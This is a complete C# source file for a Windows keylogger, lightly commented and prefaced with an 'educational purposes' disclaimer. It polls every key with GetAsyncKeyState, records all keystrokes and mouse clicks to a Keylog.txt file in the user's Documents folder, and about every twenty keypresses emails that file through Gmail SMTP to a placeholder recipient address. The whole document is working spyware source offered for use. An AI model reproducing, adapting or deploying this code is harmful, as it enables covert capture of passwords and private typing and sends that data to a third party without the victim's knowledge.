//This was made for educational purposes I am NOT legally responsible for any ill-use anyone else commits with this program. 
//Due to OEM keys this will only work on UK keybaoards
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Mail;  //dependicies needed for the program to run



namespace Not_a_Key_log_V6
{
    static class Program
    {

        //global variables 
        static bool BigChar = false;
        static bool shift = false;
        static int littleNum;
        static int count = 0;
        static string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); //this is just the directory where the file is going to go 
        static string path = (filePath + @"\Keylog.txt"); //this is the path to the file, it's called Keylog.txt it can be found in the MyDocuments directory



        [DllImport("User32.dll")] //the current user logged into the computer 
        public static extern int GetAsyncKeyState(Int32 i); 





        static void Main(String[] args)
        {
            if (!Directory.Exists(filePath)) //makes sure the directory exists that we want to create the file in 
            {
                Directory.CreateDirectory(filePath); //if the directory doesn't exist we will make it
            }

            if (!File.Exists(path)) //makes sure the file exists. 
            {
                using (StreamWriter sw = File.CreateText(path)) //creates the file if it doesn't exist 
                {


                }
            }


            // Console.WriteLine("Test");  
            while (true)
            {
                Thread.Sleep(60); //makes the system "sleep" so the program can log the keys. 
                for (int i = 0; i < 255; i++) //numerical representation of each key
                {



                    int KeyState = GetAsyncKeyState(i); //checks if key is up or down when the function is called hence the 'state' 








                    if (KeyState == 32769) //registers if a key has been pressed. If a key has been pressed 32769 would be logged
                    {
                        count++;
                        Console.WriteLine(count); //logs how many keys have been pressed

                        littleNum = 0; //this'll be important later

                        string buf = ((char)i).ToString(); //this makes sure we get the actual keys NOT the numbers of the keys 
                        //Note: number pad keys haven't been added 
                        //the if statements below handle when special characters or OEM characters pressed 
                        if (((Keys)i) == (Keys.Oem7))
                        {
                            buf = "#";
                            littleNum = 35; //littleNum will be used to handle when shift is pressed, littleNum is the same as the ASCII character for that key. 
                        }
                        if (((Keys)i) == (Keys.Oemtilde))
                        {
                            buf = "<SSM>"; //stands for Small speech marks refers to these - '' 
                            littleNum = 39;
                        }
                        if (((Keys)i) == (Keys.Oemcomma))
                        {
                            buf = ",";
                            littleNum = 44;
                        }
                        if (((Keys)i) == (Keys.OemMinus))
                        {
                            buf = "-";
                            littleNum = 45;
                        }

                        if (((Keys)i) == (Keys.OemPeriod))
                        {
                            buf = ".";
                            littleNum = 46;
                        }
                        if (((Keys)i) == (Keys.OemQuestion))
                        {
                            buf = "/";
                            littleNum = 47;
                        }
                        if (((Keys)i) == (Keys.OemSemicolon))
                        {
                            buf = ";";
                            littleNum = 59;
                        }
                        if (((Keys)i) == (Keys.Oemplus))
                        {
                            buf = "=";
                            littleNum = 61;
                        }

                        if (((Keys)i) == (Keys.OemOpenBrackets))
                        {
                            buf = "[";
                            littleNum = 91;
                        }
                        if (((Keys)i) == (Keys.OemPipe))
                        {
                            buf = "<BKS>"; //stands for Back Slash refers to this: \
                            littleNum = 92;
                        }
                        if (((Keys)i) == (Keys.OemCloseBrackets))
                        {
                            buf = "]";
                            littleNum = 93;
                        }
                        if (((Keys)i) == (Keys.Oem8))
                        {
                            buf = "`";
                            littleNum = 96;
                        }
                        if (((Keys)i) == (Keys.Space))
                        {
                            buf = "<Space>"; //keys such as space are done like this to make it easier read when they are logged
                        }
                        if (((Keys)i) == (Keys.LButton) || ((Keys)i) == (Keys.RButton))
                        {
                            buf = "<Click>";
                        }
                        if (((Keys)i) == (Keys.Back))
                        {
                            buf = ("<BackS>");  
                        }
                        if (((Keys)i) == (Keys.LControlKey) || (((Keys)i) == (Keys.ControlKey)) || (((Keys)i) == (Keys.RControlKey))) //Handles the control keys
                        {                                                                                                   
                            buf = "<Ctrl>";
                            count--; //one is take from count as two key presses are recorded when holding down control. 
                        }
                        if (((Keys)i) == (Keys.Enter))
                        {
                            buf = "<Enter>";
                        }
                        if (((Keys)i) == (Keys.Escape))
                        {
                            buf = "<Escape>"; 
                        }
                        short shiftState = (short)GetAsyncKeyState(16); //handles when shift is pressed 
                        if ((shiftState & 0x8000) == 0x8000)
                        {
                            shift = true;
                            if (((Keys)i) == (Keys.RShiftKey)) 
                            {
                                buf = "<RShift>";
                                count--; //one is take from count as two key presses are recorded when holding down and releasing shift
                            }


                        }
                        else
                        {
                            shift = false;
                        }


                        if (((Keys)i) == (Keys.CapsLock)) //handles caps lock 
                        {
                            buf = "<Caps>";
                            if (BigChar == true)    
                            {
                                BigChar = false;
                            }
                            else if (BigChar == false)
                            {
                                BigChar = true;
                            }
                        }
                        if (BigChar == false && shift == false)
                        {
                            //by defualt any key logged would be in caps, this makes sure lower cases are recorded. 
                            switch ((char)i)
                            {
                                case (char)65:
                                   
                                    buf = "a";
                                    break;
                                case (char)66:
                                    buf = "b";
                                    break;
                                case (char)67:
                                    buf = "c";
                                    break;
                                case (char)68:
                                    buf = "d";
                                    break;
                                case (char)69:
                                    buf = "e";
                                    break;
                                case (char)70:
                                    buf = "f";
                                    break;
                                case (char)71:
                                    buf = "g";
                                    break;
                                case (char)72:
                                    buf = "h";
                                    break;
                                case (char)73:
                                    buf = "i";
                                    break;
                                case (char)74:
                                    buf = "j";
                                    break;
                                case (char)75:
                                    buf = "k";
                                    break;
                                case (char)76:
                                    buf = "l";
                                    break;
                                case (char)77:
                                    buf = "m";
                                    break;
                                case (char)78:
                                    buf = "n";
                                    break;
                                case (char)79:
                                    buf = "o";
                                    break;
                                case (char)80:
                                    buf = "p";
                                    break;
                                case (char)81:
                                    buf = "q";
                                    break;
                                case (char)82:
                                    buf = "r";
                                    break;
                                case (char)83:
                                    buf = "s";
                                    break;
                                case (char)84:
                                    buf = "t";
                                    break;
                                case (char)85:
                                    buf = "u";
                                    break;
                                case (char)86:
                                    buf = "v";
                                    break;
                                case (char)87:
                                    buf = "w";
                                    break;
                                case (char)88:
                                    buf = "x";
                                    break;
                                case (char)89:
                                    buf = "y";
                                    break;
                                case (char)90:
                                    buf = "z";
                                    break;


                            }







                        }
                        else
                        {
                            if (shift) //handles different characters when shift is pressed 
                            {



                                switch ((char)i)
                                {
                                    case (char)16: 
                                        buf = "<shift>"; 
                                        count--;
                                        break;
                                    case (char)48:
                                        buf = ")";
                                        break;
                                    case (char)49:
                                        buf = "!";
                                        break;
                                    case (char)50:
                                        buf = "<SM>";
                                        break;
                                    case (char)51:
                                        buf = "£";
                                        break;
                                    case (char)52:
                                        buf = "$";
                                        break;
                                    case (char)53:
                                        buf = "%";
                                        break;
                                    case (char)54:
                                        buf = "^";
                                        break;
                                    case (char)55:
                                        buf = "&";
                                        break;
                                    case (char)56:
                                        buf = "*";
                                        break;
                                    case (char)57:
                                        buf = "(";
                                        break;
                                }
                                switch (littleNum) //handles different characters when shift is pressed for OEM keys and special keys. 
                                {
                                    case 35:
                                        buf = "~";
                                        break;
                                    case 39:
                                        buf = "@";
                                        break;
                                    case 44:
                                        buf = "<";
                                        break;
                                    case 45:
                                        buf = "_";
                                        break;
                                    case 46:
                                        buf = ">";
                                        break;
                                    case 47:
                                        buf = "?";
                                        break;
                                    case 59:
                                        buf = ":";
                                        break;
                                    case 61:
                                        buf = "+";
                                        break;
                                    case 91:
                                        buf = "{";
                                        break;
                                    case 92:
                                        buf = "|";
                                        break;
                                    case 93:
                                        buf = "}";
                                        break;
                                    case 96:
                                        buf = "¬";
                                        break;
                                    case 100:
                                        buf = "shift";
                                        break;
                                }




                            }




                        }
                        using (StreamWriter sw = File.AppendText(path)) //this just sends the keys to the text file 
                        {
                            if (count == 20) //every time a key is pressed 1 is added to count
                            {               //when count = 20 the follwing function will run
                                sw.Close(); //stops anything writting to the file so we can send it. 

                                EmailSend(); //send an email with text file with the logged keys
                                count = 0; //resets count. 


                            }
                            else
                            {
                                Console.WriteLine(buf); //logs in the console the expected key thats been pressed

                                sw.Write(buf); //writes they keys to a file. 


                            }



                        }
                    }
                }


            }
        }
        static void EmailSend() //Function to send email. 
        {
            SmtpClient Client = new SmtpClient() //Smtp = Simple mail transfer protocol, the rules the allow for emails to be sent. 
            {
                Host = "smtp.gmail.com", //the service we'll use to send the email, this only works with Gmail emails 
                Port = 587, //Gmail port, only works with Gmail accounts
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network, 
                UseDefaultCredentials = false, //removes all previous credentials
                Credentials = new NetworkCredential() //sets up new credentials so the program can sign in and send the email
                {
                    UserName = "[Sender Email]",
                    Password = "[Sender Email Password]"
                }

            };
            MailAddress FromEmail = new MailAddress("[Sender Email]");  //I bet you thought one of these would be my actual email right?
            MailAddress ToEmail = new MailAddress("[Recipient Email]");   //Of course it wouldn't be, am I stupid? 
            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment(path); //will find file on this path, the Keylog.txt file
            MailMessage Message = new MailMessage()
            {
                From = FromEmail,
                Subject = "Text File",
                Body = "Text File",




            };
            Message.Attachments.Add(attachment); //attaches the Keylog.txt file

            Message.To.Add(ToEmail); 
            try
            {
                Client.Send(Message); //trys to send the email
                Console.WriteLine("Sent");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error"); //Catches error if the email can't be send
            }
            attachment.Dispose(); //stops function from using file so it can be continue to be written to 





        }


    }
}
//Extra:
//OEM keys are keys given unique value by the manufacter they can differ between countries or different makes of keyboard 
//Case-Switch statements work the same way as if statements, they are easier to read and can benefit performance, ideal when there are lots of possible outcomes
//try-catch statements, try to execute a block of code, if an error occurs you can catch and handle it stopping the program crashing and keeping it running
